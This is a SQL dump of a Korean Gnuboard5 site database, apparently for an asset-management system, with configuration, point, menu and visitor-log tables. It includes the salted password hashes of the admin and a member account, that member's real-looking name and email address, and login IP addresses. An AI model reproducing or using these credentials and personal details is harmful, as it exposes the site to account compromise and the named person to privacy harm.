INSERT INTO `g5_faq_master` VALUES ('1', '자주하시는 질문', '', '', '', '', '0');
INSERT INTO `g5_group` VALUES ('business', '사업관리', 'both', '', '0', '0', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '');
INSERT INTO `g5_group` VALUES ('community', '커뮤니티', 'both', '', '0', '0', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '');
INSERT INTO `g5_group` VALUES ('product', '자산관리시스템', 'both', '', '0', '0', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '');
INSERT INTO `g5_login` VALUES ('121.190.219.223', 'admin', '2024-05-24 21:46:29', 'NI팀 1 페이지', '');
INSERT INTO `g5_login` VALUES ('212.71.255.83', '', '2024-05-24 21:50:43', '자산관리시스템', '/');
INSERT INTO `g5_member` VALUES ('1', 'admin', 'sha256:12000:2u//tOe0nslo9WBIABVYiX5pfmVTbGLl:68PMXC3kxCwfN76V2CKJSqO0Awk4snn5', '최고관리자', '최고관리자', '0000-00-00', 'admin@domain.com', '', '10', '', '', '', '', '', '0', '', '', '', '', '', '', '', '', '', '2115', '2024-05-24 21:46:21', '121.190.219.223', '2022-08-15 01:12:04', '127.0.0.1', '', '', '2022-08-15 01:12:04', '', '', '', '1', '0', '1', '0000-00-00', '', '', '0', '0', '', '', '', '', '', '', '', '', '', '');
INSERT INTO `g5_member` VALUES ('2', 'yeshua21', 'sha256:12000:6XHX0RHr3eZ1NcyKfZFhCtu8pv1NpnT5:X9jZiaLWU6iV7k0TI/nn2/Y6aajroA+n', '임현우', '임현우', '2022-08-17', 'yblmmen@nate.com', '', '2', '', '', '', '', '', '0', '', '', '', '', '', '', '', '', '', '1005', '2022-08-17 08:14:35', '61.72.206.229', '2022-08-17 08:14:35', '61.72.206.229', '', '', '2022-08-17 08:14:35', '', '', '', '1', '0', '1', '2022-08-17', '', '', '0', '0', '', '', '', '', '', '', '', '', '', '');
INSERT INTO `g5_menu` VALUES ('383', '10', 'NI팀', 'http://34.64.36.149/bbs/board.php?bo_table=qr', 'self', '0', '1', '1');
INSERT INTO `g5_menu` VALUES ('384', '20', '일정', 'http://34.64.36.149/bbs/board.php?bo_table=day', 'self', '0', '1', '1');
INSERT INTO `g5_menu` VALUES ('385', '30', '증적자료', 'http://34.64.36.149/bbs/board.php?bo_table=gallery', 'self', '0', '1', '1');
INSERT INTO `g5_menu` VALUES ('386', '40', 'QR테스트', 'http://34.64.36.149/bbs/board.php?bo_table=test', 'self', '0', '1', '1');
INSERT INTO `g5_point` VALUES ('1', 'admin', '2022-08-15 01:12:26', '2022-08-15 첫로그인', '100', '1', '0', '9999-12-31', '100', '@login', 'admin', '2022-08-15');
INSERT INTO `g5_point` VALUES ('3', 'admin', '2022-03-01 17:24:25', '공지사항 1 글쓰기', '5', '0', '0', '9999-12-31', '105', 'notice', '1', '쓰기');
INSERT INTO `g5_point` VALUES ('4', 'admin', '2022-03-01 17:24:37', '질문답변 1 글쓰기', '5', '0', '0', '9999-12-31', '110', 'qa', '1', '쓰기');
INSERT INTO `g5_point` VALUES ('7', 'admin', '2022-08-16 06:06:17', '2022-08-16 첫로그인', '100', '0', '0', '9999-12-31', '210', '@login', 'admin', '2022-08-16');
INSERT INTO `g5_point` VALUES ('8', 'yeshua21', '2022-08-17 08:14:35', '회원가입 축하', '1000', '0', '0', '9999-12-31', '1000', '@member', 'yeshua21', '회원가입');
INSERT INTO `g5_point` VALUES ('9', 'yeshua21', '2022-08-17 08:15:16', '질문답변 2 글쓰기', '5', '0', '0', '9999-12-31', '1005', 'qa', '2', '쓰기');
INSERT INTO `g5_point` VALUES ('10', 'admin', '2022-08-17 08:15:37', '2022-08-17 첫로그인', '100', '0', '0', '9999-12-31', '310', '@login', 'admin', '2022-08-17');
INSERT INTO `g5_point` VALUES ('11', 'admin', '2022-08-17 08:15:47', '질문답변 2 글읽기', '-1', '0', '1', '2022-08-17', '309', 'qa', '2', '읽기');
INSERT INTO `g5_point` VALUES ('12', 'admin', '2022-08-17 08:15:58', '질문답변 2-3 댓글쓰기', '1', '0', '0', '9999-12-31', '310', 'qa', '3', '댓글');
INSERT INTO `g5_point` VALUES ('13', 'admin', '2022-08-19 09:38:18', '2022-08-19 첫로그인', '100', '0', '0', '9999-12-31', '410', '@login', 'admin', '2022-08-19');
INSERT INTO `g5_point` VALUES ('14', 'admin', '2022-08-29 06:23:01', '2022-08-29 첫로그인', '100', '0', '0', '9999-12-31', '510', '@login', 'admin', '2022-08-29');
INSERT INTO `g5_point` VALUES ('15', 'admin', '2022-09-13 11:53:18', '2022-09-13 첫로그인', '100', '0', '0', '9999-12-31', '610', '@login', 'admin', '2022-09-13');
INSERT INTO `g5_point` VALUES ('16', 'admin', '2022-09-22 12:26:52', '2022-09-22 첫로그인', '100', '0', '0', '9999-12-31', '710', '@login', 'admin', '2022-09-22');
INSERT INTO `g5_point` VALUES ('17', 'admin', '2023-04-25 21:54:31', '2023-04-25 첫로그인', '100', '0', '0', '9999-12-31', '810', '@login', 'admin', '2023-04-25');
INSERT INTO `g5_point` VALUES ('18', 'admin', '2023-04-26 00:00:01', '2023-04-26 첫로그인', '100', '0', '0', '9999-12-31', '910', '@login', 'admin', '2023-04-26');
INSERT INTO `g5_point` VALUES ('19', 'admin', '2023-04-26 00:05:46', '문의 0 글쓰기', '5', '0', '0', '9999-12-31', '915', 'qna', '0', '쓰기');
INSERT INTO `g5_point` VALUES ('20', 'admin', '2023-04-27 12:24:55', '2023-04-27 첫로그인', '100', '0', '0', '9999-12-31', '1015', '@login', 'admin', '2023-04-27');
INSERT INTO `g5_point` VALUES ('21', 'admin', '2023-04-30 22:57:26', '2023-04-30 첫로그인', '100', '0', '0', '9999-12-31', '1115', '@login', 'admin', '2023-04-30');
INSERT INTO `g5_point` VALUES ('22', 'admin', '2023-05-05 21:46:31', '2023-05-05 첫로그인', '100', '0', '0', '9999-12-31', '1215', '@login', 'admin', '2023-05-05');
INSERT INTO `g5_point` VALUES ('23', 'admin', '2023-05-07 14:23:37', '2023-05-07 첫로그인', '100', '0', '0', '9999-12-31', '1315', '@login', 'admin', '2023-05-07');
INSERT INTO `g5_point` VALUES ('24', 'admin', '2024-04-11 11:54:24', '2024-04-11 첫로그인', '100', '0', '0', '9999-12-31', '1415', '@login', 'admin', '2024-04-11');
INSERT INTO `g5_point` VALUES ('25', 'admin', '2024-04-18 09:57:25', '2024-04-18 첫로그인', '100', '0', '0', '9999-12-31', '1515', '@login', 'admin', '2024-04-18');
INSERT INTO `g5_point` VALUES ('30', 'admin', '2024-05-01 15:44:20', '2024-05-01 첫로그인', '100', '0', '0', '9999-12-31', '1615', '@login', 'admin', '2024-05-01');
INSERT INTO `g5_point` VALUES ('31', 'admin', '2024-05-02 08:32:06', '2024-05-02 첫로그인', '100', '0', '0', '9999-12-31', '1715', '@login', 'admin', '2024-05-02');
INSERT INTO `g5_point` VALUES ('32', 'admin', '2024-05-03 12:56:08', '2024-05-03 첫로그인', '100', '0', '0', '9999-12-31', '1815', '@login', 'admin', '2024-05-03');
INSERT INTO `g5_point` VALUES ('33', 'admin', '2024-05-09 13:08:06', '2024-05-09 첫로그인', '100', '0', '0', '9999-12-31', '1915', '@login', 'admin', '2024-05-09');
INSERT INTO `g5_point` VALUES ('34', 'admin', '2024-05-13 08:20:20', '2024-05-13 첫로그인', '100', '0', '0', '9999-12-31', '2015', '@login', 'admin', '2024-05-13');
INSERT INTO `g5_point` VALUES ('35', 'admin', '2024-05-24 21:46:21', '2024-05-24 첫로그인', '100', '0', '0', '9999-12-31', '2115', '@login', 'admin', '2024-05-24');
INSERT INTO `g5_qa_config` VALUES ('1:1문의', '회원|포인트', 'theme/Bootstrap5', 'theme/Bootstrap5', '1', '0', '1', '0', '0', '0', '', '', '1', '60', '30', '15', '15', '600', '1048576', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '');
INSERT INTO `g5_qa_config` VALUES ('1:1문의', '회원|포인트', 'theme/Bootstrap5', 'theme/Bootstrap5', '1', '0', '1', '0', '0', '0', '', '', '1', '60', '30', '15', '15', '600', '1048576', '', '', '', '<p><br></p><script type=\"text/javascript\" charset=\"UTF-8\" src=\"chrome-extension://aefibgbaijilanbphdomgjlogkldhlpm/vendor/crypto/aes.js\"></script><script type=\"text/javascript\" charset=\"UTF-8\" src=\"chrome-extension://aefibgbaijilanbphdomgjlogkldhlpm/vendor/crypto/pad-zeropadding-min.js\"></script>', '<p><br></p><script type=\"text/javascript\" charset=\"UTF-8\" src=\"chrome-extension://aefibgbaijilanbphdomgjlogkldhlpm/vendor/crypto/aes.js\"></script><script type=\"text/javascript\" charset=\"UTF-8\" src=\"chrome-extension://aefibgbaijilanbphdomgjlogkldhlpm/vendor/crypto/pad-zeropadding-min.js\"></script>', '<p><br></p><script type=\"text/javascript\" charset=\"UTF-8\" src=\"chrome-extension://aefibgbaijilanbphdomgjlogkldhlpm/vendor/crypto/aes.js\"></script><script type=\"text/javascript\" charset=\"UTF-8\" src=\"chrome-extension://aefibgbaijilanbphdomgjlogkldhlpm/vendor/crypto/pad-zeropadding-min.js\"></script>', '<p><br></p><script type=\"text/javascript\" charset=\"UTF-8\" src=\"chrome-extension://aefibgbaijilanbphdomgjlogkldhlpm/vendor/crypto/aes.js\"></script><script type=\"text/javascript\" charset=\"UTF-8\" src=\"chrome-extension://aefibgbaijilanbphdomgjlogkldhlpm/vendor/crypto/pad-zeropadding-min.js\"></script>', '', '', '', '', '', '', '', '', '', '');
INSERT INTO `g5_shop_default` VALUES ('대표자명', '회사명', '123-45-67890', '02-123-4567', '02-123-4568', '제 OO구 - 123호', '123-456', 'OO도 OO시 OO구 OO동 123-45', '정보책임자명', '정보책임자 E-mail', 'theme/Bootstrap5', 'theme/Bootstrap5', '1', 'main.10.skin.php', '5', '1', '160', '160', '1', 'main.20.skin.php', '4', '1', '215', '215', '1', 'main.40.skin.php', '4', '1', '215', '215', '1', 'main.50.skin.php', '5', '1', '215', '215', '1', 'main.30.skin.php', '4', '1', '215', '215', '1', 'main.30.skin.php', '2', '4', '230', '230', '1', 'main.10.skin.php', '2', '2', '230', '230', '1', 'main.10.skin.php', '2', '4', '300', '300', '1', 'main.20.skin.php', '2', '2', '80', '80', '1', 'main.10.skin.php', '2', '2', '230', '230', '1', 'relation.10.skin.php', '5', '215', '215', '1', 'relation.10.skin.php', '3', '230', '230', 'list.10.skin.php', '5', '5', '225', '225', 'list.10.skin.php', '2', '5', '230', '230', 'list.10.skin.php', '5', '5', '225', '225', 'list.10.skin.php', '2', '5', '230', '230', '1', 'OO은행 12345-67-89012 예금주명', '1', '0', '0', '0', '5000', '50000', '100', '1', '', '차등', '20000;30000;40000', '4000;3000;2000', '0', '3', '배송 안내 입력전입니다.', '교환/반품 안내 입력전입니다.', '7', '230', '230', '300', '300', '{이름}님의 회원가입을 축하드립니다.\nID:{회원아이디}\n{회사명}', '{이름}님 주문해주셔서 고맙습니다.\n{주문번호}\n{주문금액}원\n{회사명}', '{이름}님께서 주문하셨습니다.\n{주문번호}\n{주문금액}원\n{회사명}', '{이름}님 입금 감사합니다.\n{입금액}원\n주문번호:\n{주문번호}\n{회사명}', '{이름}님 배송합니다.\n택배:{택배회사}\n운송장번호:\n{운송장번호}\n{회사명}', '0', '0', '0', '0', '0', '', 'kcp', '', '', '', '', '', '', '0', '0', '', '0', '0', '0', '0', '1', '0', '1', '15', '0', '12345호', '0', '0', 'account', '', '0', '0', '0', '', '', '', '', '', '', '', '', '0', '', '', '0', '0', '0', '0');
INSERT INTO `g5_uniqid` VALUES ('2022030113230047', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030113590848', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030113592869', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030113593291', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030113595841', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030115430842', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030115434362', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030115454715', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030116054237', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030116065909', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030116190124', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030116193879', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030116241040', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030116242172', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030116243798', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030116244948', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030116263058', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030116263698', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030116371754', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030116431702', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030116462061', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030116490915', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030116571341', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030116575391', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030116593681', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030116594969', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030117000712', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030117062136', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030117064682', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030117072881', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030117073943', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030117085513', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030117094752', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030117235931', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030117241208', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030117241630', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030117243028', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030117312581', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030117410678', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030117450996', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030117491335', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030118091233', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030118092625', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030118261934', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030118263203', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030118264221', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030118273762', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030118282579', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030118290731', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030118333207', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030118333631', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030118361802', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030118365798', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030118371590', '127.0.0.1');
INSERT INTO `g5_uniqid` VALUES ('2022030119592641', '192.168.200.254');
INSERT INTO `g5_uniqid` VALUES ('2022030120094970', '192.168.200.254');
INSERT INTO `g5_uniqid` VALUES ('2022030120104200', '192.168.200.254');
INSERT INTO `g5_uniqid` VALUES ('2022030120123488', '192.168.200.254');
INSERT INTO `g5_uniqid` VALUES ('2022030120140409', '192.168.200.254');
INSERT INTO `g5_uniqid` VALUES ('2022030120142260', '192.168.200.254');
INSERT INTO `g5_uniqid` VALUES ('2022030120155090', '192.168.200.254');
INSERT INTO `g5_uniqid` VALUES ('2022030120171551', '192.168.200.254');
INSERT INTO `g5_uniqid` VALUES ('2022030120172235', '192.168.200.254');
INSERT INTO `g5_uniqid` VALUES ('2022030120180168', '192.168.200.254');
INSERT INTO `g5_uniqid` VALUES ('2022030120204723', '192.168.200.254');
INSERT INTO `g5_uniqid` VALUES ('2022030120214223', '192.168.200.254');
INSERT INTO `g5_uniqid` VALUES ('2022030122144688', '192.168.200.254');
INSERT INTO `g5_uniqid` VALUES ('2022030122152270', '192.168.200.254');
INSERT INTO `g5_uniqid` VALUES ('2022081606483664', '54.36.148.75');
INSERT INTO `g5_uniqid` VALUES ('2022081708150182', '61.72.206.229');
INSERT INTO `g5_uniqid` VALUES ('2022092212244340', '121.131.26.231');
INSERT INTO `g5_uniqid` VALUES ('2022092212263510', '121.131.26.231');
INSERT INTO `g5_uniqid` VALUES ('2022092212270472', '121.131.26.231');
INSERT INTO `g5_uniqid` VALUES ('2022092212274597', '121.131.26.231');
INSERT INTO `g5_uniqid` VALUES ('2023042523524085', '158.180.78.143');
INSERT INTO `g5_uniqid` VALUES ('2023042523530111', '158.180.78.143');
INSERT INTO `g5_uniqid` VALUES ('2023042523575592', '158.180.78.143');
INSERT INTO `g5_uniqid` VALUES ('2023042523584755', '158.180.78.143');
INSERT INTO `g5_uniqid` VALUES ('2023042523595126', '158.180.78.143');
INSERT INTO `g5_uniqid` VALUES ('2023042600001070', '158.180.78.143');
INSERT INTO `g5_uniqid` VALUES ('2023042600010521', '158.180.78.143');
INSERT INTO `g5_uniqid` VALUES ('2023042600011520', '158.180.78.143');
INSERT INTO `g5_uniqid` VALUES ('2023042600034082', '59.15.49.3');
INSERT INTO `g5_uniqid` VALUES ('2023042600052738', '59.15.49.3');
INSERT INTO `g5_uniqid` VALUES ('2023042600071431', '59.15.49.3');
INSERT INTO `g5_uniqid` VALUES ('2023042600083589', '59.15.49.3');
INSERT INTO `g5_uniqid` VALUES ('2023042600123915', '59.15.49.3');
INSERT INTO `g5_uniqid` VALUES ('2023050116503596', '136.243.228.197');
INSERT INTO `g5_uniqid` VALUES ('2023050116511756', '136.243.220.213');
INSERT INTO `g5_uniqid` VALUES ('2023050116515805', '136.243.220.213');
INSERT INTO `g5_uniqid` VALUES ('2023050116545936', '136.243.220.213');
INSERT INTO `g5_uniqid` VALUES ('2023050116552055', '136.243.220.213');
INSERT INTO `g5_uniqid` VALUES ('2024041112153492', '61.32.31.241');
INSERT INTO `g5_uniqid` VALUES ('2024041112170370', '61.32.31.241');
INSERT INTO `g5_uniqid` VALUES ('2024041112280857', '61.32.31.241');
INSERT INTO `g5_uniqid` VALUES ('2024041112281461', '61.32.31.241');
INSERT INTO `g5_uniqid` VALUES ('2024041112282654', '61.32.31.241');
INSERT INTO `g5_uniqid` VALUES ('2024041112292377', '61.32.31.241');
INSERT INTO `g5_uniqid` VALUES ('2024041112294997', '61.32.31.241');
INSERT INTO `g5_uniqid` VALUES ('2024041112305090', '61.32.31.241');
INSERT INTO `g5_uniqid` VALUES ('2024041112320269', '61.32.31.241');
INSERT INTO `g5_uniqid` VALUES ('2024041112330548', '61.32.31.241');
INSERT INTO `g5_uniqid` VALUES ('2024041809573373', '61.32.31.241');
INSERT INTO `g5_uniqid` VALUES ('2024041813130053', '61.32.31.241');
INSERT INTO `g5_uniqid` VALUES ('2024041813163838', '61.32.31.241');
INSERT INTO `g5_uniqid` VALUES ('2024041813200436', '61.32.31.241');
INSERT INTO `g5_uniqid` VALUES ('2024041813385927', '61.32.31.241');
INSERT INTO `g5_uniqid` VALUES ('2024041815040009', '61.32.31.241');
INSERT INTO `g5_uniqid` VALUES ('2024050115441998', '59.15.128.169');
INSERT INTO `g5_uniqid` VALUES ('2024050116061943', '59.15.128.169');
INSERT INTO `g5_uniqid` VALUES ('2024050116141658', '59.15.128.169');
INSERT INTO `g5_uniqid` VALUES ('2024050116144432', '59.15.128.169');
INSERT INTO `g5_uniqid` VALUES ('2024050116145570', '59.15.128.169');
INSERT INTO `g5_uniqid` VALUES ('2024050116164652', '59.15.128.169');
INSERT INTO `g5_uniqid` VALUES ('2024050116173611', '59.15.128.169');
INSERT INTO `g5_uniqid` VALUES ('2024050116185248', '59.15.128.169');
INSERT INTO `g5_uniqid` VALUES ('2024050116190084', '59.15.128.169');
INSERT INTO `g5_uniqid` VALUES ('2024050116192918', '59.15.128.169');
INSERT INTO `g5_uniqid` VALUES ('2024050116195250', '59.15.128.169');
INSERT INTO `g5_uniqid` VALUES ('2024050116202247', '59.15.128.169');
INSERT INTO `g5_uniqid` VALUES ('2024050116203463', '59.15.128.169');
INSERT INTO `g5_uniqid` VALUES ('2024050116210714', '59.15.128.169');
INSERT INTO `g5_uniqid` VALUES ('2024050116213450', '59.15.128.169');
INSERT INTO `g5_uniqid` VALUES ('2024050116214588', '59.15.128.169');
INSERT INTO `g5_uniqid` VALUES ('2024050116220179', '59.15.128.169');
INSERT INTO `g5_uniqid` VALUES ('2024050116291892', '59.15.128.169');
INSERT INTO `g5_uniqid` VALUES ('2024050116321210', '59.15.128.169');
INSERT INTO `g5_uniqid` VALUES ('2024050116342538', '59.15.128.169');
INSERT INTO `g5_uniqid` VALUES ('2024050116351164', '59.15.128.169');
INSERT INTO `g5_uniqid` VALUES ('2024050116383148', '59.15.128.169');
INSERT INTO `g5_uniqid` VALUES ('2024050116385671', '59.15.128.169');
INSERT INTO `g5_uniqid` VALUES ('2024050116390468', '59.15.128.169');
INSERT INTO `g5_uniqid` VALUES ('2024050122150186', '118.235.6.198');
INSERT INTO `g5_uniqid` VALUES ('2024050208320618', '61.32.31.241');
INSERT INTO `g5_uniqid` VALUES ('2024050312560873', '61.32.31.241');
INSERT INTO `g5_uniqid` VALUES ('2024050913080628', '1.11.90.40');
INSERT INTO `g5_uniqid` VALUES ('2024050913082719', '1.11.90.40');
INSERT INTO `g5_uniqid` VALUES ('2024050914315804', '1.11.90.40');
INSERT INTO `g5_uniqid` VALUES ('2024051308202079', '61.32.31.241');
INSERT INTO `g5_uniqid` VALUES ('2024051308203552', '61.32.31.241');
INSERT INTO `g5_uniqid` VALUES ('2024051308220369', '61.32.31.241');
INSERT INTO `g5_uniqid` VALUES ('2024051308223683', '61.32.31.241');
INSERT INTO `g5_uniqid` VALUES ('2024051308231409', '61.32.31.241');
INSERT INTO `g5_uniqid` VALUES ('2024051308241932', '61.32.31.241');
INSERT INTO `g5_uniqid` VALUES ('2024051308242946', '61.32.31.241');
INSERT INTO `g5_uniqid` VALUES ('2024051308243528', '61.32.31.241');
INSERT INTO `g5_uniqid` VALUES ('2024052421462167', '121.190.219.223');
INSERT INTO `g5_visit` VALUES ('1264', '127.0.0.1', '2024-01-20', '11:46:08', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1265', '59.15.205.62', '2024-01-20', '11:56:24', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Whale/3.24.223.21 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1266', '117.222.3.40', '2024-01-20', '12:02:58', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1267', '192.168.219.119', '2024-01-20', '12:09:54', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1268', '61.32.31.241', '2024-04-11', '11:35:35', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1269', '146.19.24.28', '2024-04-11', '11:56:46', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1270', '45.79.181.251', '2024-04-11', '12:04:55', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1271', '172.104.210.105', '2024-04-11', '12:05:23', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1272', '172.104.11.34', '2024-04-11', '12:05:45', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1273', '172.104.11.4', '2024-04-11', '12:06:23', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1274', '172.104.11.51', '2024-04-11', '12:06:34', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1275', '45.79.172.21', '2024-04-11', '12:07:08', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1276', '172.105.128.12', '2024-04-11', '12:07:25', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1277', '45.79.128.205', '2024-04-11', '12:07:48', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1278', '45.33.80.243', '2024-04-11', '12:08:07', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1279', '185.150.26.240', '2024-04-11', '12:14:24', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1280', '207.154.202.37', '2024-04-11', '12:22:23', '', 'Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)', '', '', '');
INSERT INTO `g5_visit` VALUES ('1281', '45.79.168.172', '2024-04-11', '12:38:29', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1282', '45.79.181.223', '2024-04-11', '13:07:56', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1283', '172.105.128.13', '2024-04-11', '13:26:46', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1284', '192.241.203.37', '2024-04-11', '13:58:51', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1285', '192.155.88.231', '2024-04-11', '14:04:57', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1286', '45.79.181.104', '2024-04-11', '14:32:37', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1287', '185.224.128.43', '2024-04-11', '14:39:21', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1288', '198.74.56.46', '2024-04-11', '14:44:29', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1289', '198.235.24.216', '2024-04-11', '14:49:04', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1290', '66.175.213.4', '2024-04-11', '14:57:22', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1291', '45.79.163.53', '2024-04-11', '15:01:29', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1292', '194.120.230.94', '2024-04-11', '15:19:39', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1293', '167.94.145.56', '2024-04-11', '15:40:22', '', '', '', '', '');
